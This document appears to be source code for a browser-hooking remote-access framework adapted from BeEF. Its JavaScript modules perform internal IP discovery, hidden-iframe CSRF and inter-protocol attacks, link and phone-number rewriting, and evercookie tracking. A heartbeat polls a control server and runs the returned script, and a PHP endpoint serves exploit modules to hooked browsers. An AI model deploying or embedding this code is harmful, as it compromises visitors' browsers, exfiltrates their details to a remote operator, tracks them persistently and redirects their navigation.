                if (typeof o[k] == "function") 
                    continue;  //skip pairs where the value is a function.
            
                var val = $.toJSON(o[k]);
            
                pairs.push(name + ":" + val);
            }

            return "{" + pairs.join(", ") + "}";
        }
    },

    quoteString: function(string) {
        if (string.match(this._escapeable))
        {
            return '"' + string.replace(this._escapeable, function (a) 
            {
                var c = this._meta[a];
                if (typeof c === 'string') return c;
                c = a.charCodeAt();
                return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
            }) + '"';
        }
        return '"' + string + '"';
    },
	
	    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
    arrayToJSON:function (r) {
        if (this.array_has_string_key(r)) {
            var obj = {};
            for (var key in r)
                obj[key] = (this.array_has_string_key(obj[key])) ? this.arrayToJSON(r[key]) : r[key];
            return obj;
        }
        return r;
    },

    //Detects if an array has a string key
    array_has_string_key:function (arr) {
        if ($.isArray(arr)) {
            try {
                for (var key in arr)
                    if (isNaN(parseInt(key))) return true;
            } catch (e) {
            }
        }
        return false;
    },
    _escapeable: /["\\\x00-\x1f\x7f-\x9f]/g,
    
    _meta : {
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\f': '\\f',
        '\r': '\\r',
        '"' : '\\"',
        '\\': '\\\\'
    }
};



//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: rat.net.local
 * 
 * Provides networking functions for the local/internal network of the zombie.
 */
rat.net.local = {
	
	sock: false,
	checkJava: false,
	hasJava: false,
	
	/**
	 * Initializes the java socket. We have to use this method because
	 * some browsers do not have java installed or it is not accessible.
	 * in which case creating a socket directly generates an error. So this code
	 * is invalid:
	 * sock: new java.net.Socket();
	 */

	initializeSocket: function() {
		if(this.checkJava){	
			if(!rat.browser.hasJava()) {
				this.checkJava=True;
				this.hasJava=False;
				return -1;
			}else{
				this.checkJava=True;
				this.hasJava=True;
				return 1;
			}
		}
		else{
			if(!this.hasJava) return -1;
			else{	
				try {
					this.sock = new java.net.Socket();
				} catch(e) {
					return -1;
				}
				return 1;
			}
		}
	},
	
	/**
	 * Returns the internal IP address of the zombie.
	 * @return: {String} the internal ip of the zombie.
	 * @error: return -1 if the internal ip cannot be retrieved.
	 */
	getLocalAddress: function() {
		if(!this.hasJava) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			return this.sock.getLocalAddress().getHostAddress();
		} catch(e) { return false; }
	},
	
	/**
	 * Returns the internal hostname of the zombie.
	 * @return: {String} the internal hostname of the zombie.
	 * @error: return -1 if the hostname cannot be retrieved.
	 */
	getLocalHostname: function() {
		if(!this.hasJava) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			return this.sock.getLocalAddress().getHostName();
		} catch(e) { return false; }
	}
	
};

rat.regCmp('rat.net.local');


rat.regCmp('rat.encode.json');
$.stringify = function(o) {return rat.encode.json.stringify(o);};
$.arrayToJSON = function(o) {return rat.encode.json.arrayToJSON(o);};
$.quoteString = function(o) {return rat.encode.json.quoteString(o);};


rat.net.cors = {

  handler: "cors",

    /**
     * Response Object - used in the rat.net.request callback
     */
    response:function () {
        this.status  = null;      // 500, 404, 200, 302, etc
        this.headers = null;      // full response headers
        this.body    = null;      // full response body
    },

    /**
     * Make a cross-domain request using CORS
     *
     * @param method {String} HTTP verb ('GET', 'POST', 'DELETE', etc.)
     * @param url {String} url
     * @param data {String} request body
     * @param callback {Function} function to callback on completion
     */
    request: function(method, url, data, callback) {

    var xhr;
    var response = new this.response;

    if (XMLHttpRequest) {
        xhr = new XMLHttpRequest();

        if ('withCredentials' in xhr) {
            xhr.open(method, url, true);
            xhr.onerror = function() {
            };
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    response.headers = this.getAllResponseHeaders()
                    response.body    = this.responseText;
                    response.status  = this.status;
                    if (!!callback) {
                        if (!!response) {
                            callback(response);
                        } else { 
                            callback('ERROR: No Response. CORS requests may be denied for this resource.')
                        }
                    }
                }
            };
            xhr.send(data);
        }
    } else if (typeof XDomainRequest != "undefined") {
        xhr = new XDomainRequest();
        xhr.open(method, url);
        xhr.onerror = function() {
        };
        xhr.onload = function() {
            response.headers = this.getAllResponseHeaders()
            response.body    = this.responseText;
            response.status  = this.status;
            if (!!callback) {
                if (!!response) {
                    callback(response);
                } else {
                    callback('ERROR: No Response. CORS requests may be denied for this resource.')
                }
            }
        };
        xhr.send(data);
    } else {
        if (!!callback) callback('ERROR: Not Supported. CORS is not supported by the browser. The request was not sent.');
    }

    }

};

rat.regCmp('rat.net.cors');


//the basic info module

/*!
 * @literal object: rat.dom
 *
 * Provides functionality to manipulate the DOM.
 */
rat.dom = {
	
	/**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "rat-"
	 * @return: generated id
	 */
	generateID: function(prefix) {
		return ((prefix == null) ? 'rat-' : prefix)+Math.floor(Math.random()*99999);
	},	
		
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!rat.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},

	/**
	 * Returns the highest current z-index
	 * @param: {Boolean} whether to return an associative array with the height AND the ID of the element
	 * @return: {Integer} Highest z-index in the DOM
	 * OR
	 * @return: {Hash} A hash with the height and the ID of the highest element in the DOM {'height': INT, 'elem': STRING}
	 */
	getHighestZindex: function(include_id) {
		var highest = {'height':0, 'elem':''};
		$('*').each(function() {
			var current_high = parseInt($(this).css("zIndex"),10);
			if (current_high > highest.height) {
				highest.height = current_high;
				highest.elem = $(this).attr('id');
			}
		});

		if (include_id) {
			return highest;
		} else {
			return highest.height;
		}
	},
	
	/**
     * Create and iFrame element. In case it's create with POST method, the iFrame is automatically added to the DOM and submitted.
     * example usage in the code: rat.dom.createIframe('fullscreen', 'get', {'src':$(this).attr('href')}, {}, null);
	 * @param: {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
	 * @param: {String} method: can be 'GET' or 'POST'. defaults to GET
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iFrame has loaded
	 * @return: {Object} the inserted iFrame
	 */
	createIframe: function(type, method, params, styles, onload) {
		var css = {};
		var form_submit = (method.toLowerCase() == 'post') ? true : false; 
		if (form_submit && params['src'])
		{
			var form_action = params['src'];
			params['src'] = '';
		}
		if (type == 'hidden') {
			css = $.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles);
		} else if (type == 'fullscreen') {
			css = $.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px', 'z-index':rat.dom.getHighestZindex()+1}, styles);
			$('body').css({'padding':'0px', 'margin':'0px'});
		} else {
			css = styles;
			$('body').css({'padding':'0px', 'margin':'0px'});
		}
		var iframe = $('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		
		if (form_submit && form_action)
		{
			var id = rat.dom.generateID();
			$(iframe).attr({'id': id, 'name':id});
			var form = rat.dom.createForm({'action':form_action, 'method':'get', 'target':id}, false);
			$(form).prependTo('body').submit();
		}
		return iframe;
	},

    /**
     * Load the link (href value) in an overlay foreground iFrame.
     * The rat hook continues to run in background.
     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
     * Framebusting techniques, this will not work.
     */
    persistentIframe: function(){
        $('a').click(function(e) {
            if ($(this).attr('href') != '')
            {
                e.preventDefault();
                rat.dom.createIframe('fullscreen', 'get', {'src':$(this).attr('href')}, {}, null);
                $(document).attr('title', $(this).html());
                document.body.scroll = "no";
                document.documentElement.style.overflow = 'hidden';
            }
        });
    },

    /**
     * Load a full screen div that is black, or, transparent
     * @param: {Boolean} vis: whether or not you want the screen dimmer enabled or not
     * @param: {Hash} options: a collection of options to customise how the div is configured, as follows:
     *         opacity:0-100         // Lower number = less grayout higher = more of a blackout
     *           // By default this is 70 
     *         zindex: #             // HTML elements with a higher zindex appear on top of the gray out
     *           // By default this will use rat.dom.getHighestZindex to always go to the top
     *         bgcolor: (#xxxxxx)    // Standard RGB Hex color code
     *           // By default this is #000000
     */
	grayOut: function(vis, options) {
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || rat.dom.getHighestZindex()+1;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	        var pageWidth = document.body.scrollWidth+'px';
	        var pageHeight = document.body.scrollHeight+'px';
	    } else if( document.body.offsetWidth ) {
	      var pageWidth = document.body.offsetWidth+'px';
	      var pageHeight = document.body.offsetHeight+'px';
	    } else {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    }
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	},

	/**
	 * Remove all external and internal stylesheets from the current page - sometimes prior to socially engineering,
	 *  or, re-writing a document this is useful.
	 */
	removeStylesheets: function() {
		$('link[rel=stylesheet]').remove();
		$('style').remove();
	},
	
	/**
     * Create a form element with the specified parameters, appending it to the DOM if append == true
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
	createForm: function(params, append) {
		var form = $('<form></form>').attr(params);
		if (append)
			$('body').append(form);
		return form;
	},
	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	
	/**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $(sel).each(function() {
			if ($(this).attr('href') != null)
			{
				$(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},

	/**
	 * Rewrites all links matched by selector to url, leveraging Bilawal Hameed's hidden click event overwriting.
	 * http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksClickEvents: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $(sel).each(function() {
			if ($(this).attr('href') != null)
			{
				$(this).click(function() {this.href=url});
			}
		}).length;
	},

	/**
     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
	 * @param: {String} old_protocol: the old link protocol to be rewritten
	 * @param: {String} new_protocol: the new link protocol to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {

		var count = 0;
		var re = new RegExp(old_protocol+"://", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$(sel).each(function() {
			if ($(this).attr('href') != null) {
				var url = $(this).attr('href');
				if (url.match(re)) {
					$(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

	/**
	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
	 * @param: {String} new_number: the new link telephone number to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteTelLinks: function(new_number, selector) {

		var count = 0;
		var re = new RegExp("tel:/?/?.*", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$(sel).each(function() {
			if ($(this).attr('href') != null) {
				var url = $(this).attr('href');
				if (url.match(re)) {
					$(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

    /**
     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
     */
    parseAppletParams: function(params){
         var result = '';
         for (i in params){
           var param = params[i];
           for(key in param){
              result += "<param name='" + key + "' value='" + param[key] + "' />";
           }
         }
        return result;
    },

    /**
     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
     * example usage in the code, using a JAR archive (recommended and faster):
     * rat.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
     * example usage in the code, using codebase:
     * rat.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, rat.class.
     * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
     * @params: {String} archive: the jar that contains the code.
     * @params: {String} params: an array of additional params that the applet except.
     */
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (rat.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                "height='0' width='0' name='" + name + "'> " +
                "<param name='code' value='" + code + "' />";

            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }else{
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += rat.dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (rat.browser.isC() || rat.browser.isS() || rat.browser.isO() || rat.browser.isFF()) {

            if (codebase != null) {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += rat.dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        // For some reasons JavaPaylod is not working if the applet is attached to the DOM with the embed tag rather than the applet tag.
//        if (rat.browser.isFF()) {
//            if (codebase != null) {
//                content = "" +
//                    "<embed id='" + id + "' code='" + code + "' " +
//                    "type='application/x-java-applet' codebase='" + codebase + "' " +
//                    "height='0' width='0' name='" + name + "'>";
//            } else {
//                content = "" +
//                    "<embed id='" + id + "' code='" + code + "' " +
//                    "type='application/x-java-applet' archive='" + archive + "' " +
//                    "height='0' width='0' name='" + name + "'>";
//            }
//
//            if (params != null) {
//                content += rat.dom.parseAppletParams(params);
//            }
//            content += "</embed>";
//        }
        $('body').append(content);
    },

    /**
     * Given an id, remove the applet from the DOM.
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id) {
        $('#' + id + '').detach();
    },

    /**
     * Create an invisible iFrame with a form inside, and submit it. Useful for XSRF attacks delivered via POST requests.
     * @params: {String} action: the form action attribute, where the request will be sent.
     * @params: {String} method: HTTP method, usually POST.
     * @params: {Array} inputs: an array of inputs to be added to the form (type, name, value).
     *         example: [{'type':'hidden', 'name':'1', 'value':''} , {'type':'hidden', 'name':'2', 'value':'3'}]
     */
    createIframeXsrfForm: function(action, method, inputs){
        var iframeXsrf = rat.dom.createInvisibleIframe();

        var formXsrf = document.createElement('form');
        formXsrf.setAttribute('action', action);
        formXsrf.setAttribute('method', method);

        var input = null;
        for (i in inputs){
            var attributes = inputs[i];
            input = document.createElement('input');
                for(key in attributes){
                    input.setAttribute(key, attributes[key]);
                }
            formXsrf.appendChild(input);
        }
        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
        formXsrf.submit();

        return iframeXsrf;
    },

    /**
     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
     * @params: {String} rhost: remote host ip/domain
     * @params: {String} rport: remote port
     * @params: {String} commands: protocol commands to be executed by the remote host:port service
     */
    createIframeIpecForm: function(rhost, rport, path, commands){
        var iframeIpec = rat.dom.createInvisibleIframe();

        var formIpec = document.createElement('form');
        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
        formIpec.setAttribute('method',  'POST');
        formIpec.setAttribute('enctype', 'multipart/form-data');

        input = document.createElement('textarea');
        input.setAttribute('name', Math.random().toString(36).substring(5));
        input.value = commands;
        formIpec.appendChild(input);
        iframeIpec.contentWindow.document.body.appendChild(formIpec);
        formIpec.submit();

        return iframeIpec;
    }

};

rat.regCmp('rat.dom');


rat.session = {
	cookie_id_length: 80,
	cookie_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
	ec:new evercookie(),
	rat_cookie:"rat_cookie",
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
	get_rat_cookie_id: function() {
	// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie(rat.session.rat_cookie);
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata(rat.session.rat_cookie);
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window(rat.session.rat_cookie);
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_rat_cookie_id();
			this.set_rat_cookie_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_rat_cookie_id: function(id) {
		// persist the hook session id
		this.ec.evercookie_cookie(rat.session.rat_cookie, id);
		this.ec.evercookie_userdata(rat.session.rat_cookie, id);
		this.ec.evercookie_window(rat.session.rat_cookie, id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_rat_cookie_id: function() {
	    // init the return value
		var cookie_id = "";
		
		// construct the random string 
		for(var i=0; i<this.cookie_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.cookie_id_chars.length);
		  cookie_id += this.cookie_id_chars.charAt(rand_num);
		}
		
		return cookie_id;
	}
}

rat.regCmp('rat.session');

// the updater module

rat.updater = {
	// XHR-polling timeout.
    xhr_poll_timeout: "5",//seconds
	//the heartBeat will allways run, to get script from server
	/**
	**  stat  the stat of client  online/close
	**
	*/
	heartBeat:function(stat){//send heartbeat to server
		var path = rat.net.config.api_path+"/hb.php";
		var data = "t="+rat.net.config.ticket+"&i="+rat.net.config.pmd_id+"&s="+stat+"&ec="+rat.session.get_rat_cookie_id();
		//the request type is script,it will be auto run the response
		var response = rat.net.request(rat.net.config.protocol,"GET",rat.net.config.host,rat.net.config.port,path,null,data,rat.updater.xhr_poll_timeout,"script",null);
		if(stat!='close'){
			setTimeout("rat.updater.heartBeat('online');",rat.net.config.interval);
		}
	},
	//the postResult function will post some information or result to server 
	/**
	*  result  must a string or json object 
	*/
	postResult:function(result){//send result to server
		var path = rat.net.config.api_path+"/res.php";
		var data = "t="+rat.net.config.ticket+"&i="+rat.net.config.pmd_id+"&a="+rat.net.config.a_id+"&ec="+rat.session.get_rat_cookie_id()+"&c=";
		//Stringify json
		if(typeof(result)=="object"){
			data += rat.encode.base64.utf8_encode(JSON.stringify(result));
		}else {
			data += rat.encode.base64.utf8_encode(result);
		}
		var response = rat.net.request(rat.net.config.protocol,"GET",rat.net.config.host,rat.net.config.port,path,null,data,rat.updater.xhr_poll_timeout,"script",null);
		//alert(response);
	},
	postLog:function(message){//send log to server
		var path = rat.net.config.api_path+"/log.php";
		var data = "t="+rat.net.config.ticket+"&i="+rat.net.config.pmd_id+"&l="+message;
		var response = rat.net.request(rat.net.config.protocol,"GET",rat.net.config.host,rat.net.config.port,path,null,data,rat.updater.xhr_poll_timeout,"script",null);
	},
	browser_details:function(){
		var details = rat.browser.getDetails();
        details['rat_cookie'] = rat.session.get_rat_cookie_id();
		var details_ob = $.arrayToJSON(details);
		rat.updater.postResult(details_ob);
	}
};
rat.regCmp('rat.updater');

if(typeof rat.module !== 'object'){
	rat.module = {
		/** config must a null value or a json value
		*   such as 
		*	{
		*		remote_ip : "",
		*		remote_port : "",
		*		local_ip :"",
		*		local_port: ""
		*	} 
		*/
		config:null,
		init:function(config){
			this.config = config;
		},
		sendResult:function(result){
			rat.updater.postResult(result);
		},
		sendLog:function(message){
			rat.updater.postLog(message);
		}
		//other method or field
	}
}
rat.regCmp('rat.module');

<?php

 require_once("bin/Path.php");
 require_once("bin/util/util.php");
 require_once(PHP_BASE_DIR."/db/MySQL.php");
 require_once(PHP_BASE_DIR."/entity/ProjectModule.php");

 $db = new MySQL($log);
 $mysqli = $db->openDB();
 $projectModule = new ProjectModule($mysqli,$log);
 try{
	if($projectModule->getProjectModulesByTicket($ticket)){
		$s = new SaeStorage();
		$content = $s->fileExists(SAE_STORAGE_DOMAIN,SAE_MODULES."/".basename($projectModule->module_path))?
			$s->read(SAE_STORAGE_DOMAIN,SAE_MODULES."/".basename($projectModule->module_path))."\n":"";
		$content .= "rat.extend(true,rat.module.core,rat.module);\n";
		if($projectModule->config!=null&&$projectModule->config!="[]"){
			$content .= "rat.module.core.init(".$projectModule->config.");\n";
		}	
 	}else{
		$content = "
rat.module.core = {
	config:null,
	browser_details:function(){
		var details = rat.browser.getDetails();
		details['rat_cookie'] = rat.session.get_rat_cookie_id();
		details['Core Module Result'] = 'Can't find the core module, use the default!';
		var details_ob = $.arrayToJSON(details);
		this.sendResult(details_ob);
	},
	exploit:function(){
		this.browser_details();
	}

};\n";
	$content .= "rat.extend(true,rat.module.core,rat.module);\n";
 	}
 }catch(Exception $e){//抛出异常
		$content = "
rat.module.core = {
	config:null,
	browser_details:function(){
		var details = rat.browser.getDetails();
		details['rat_cookie'] = rat.session.get_rat_cookie_id();
		details['Core Module Result'] = 'Load Core Module Failed, Exception: ".$e->getMessage()."';
		var details_ob = $.arrayToJSON(details);
		this.sendResult(details_ob);
	},
	exploit:function(){
		this.browser_details();
	}

};\n";
	$content .= "rat.extend(true,rat.module.core,rat.module);\n";
 }
 
 echo $content;
 if($mysqli) $db->closeDB();
 ?>

window.onload = function () {
    rat.init();
	//核心模块执行入口
	rat.module.core.exploit();
};
window.onclose = function () {
	rat.onclose();
};
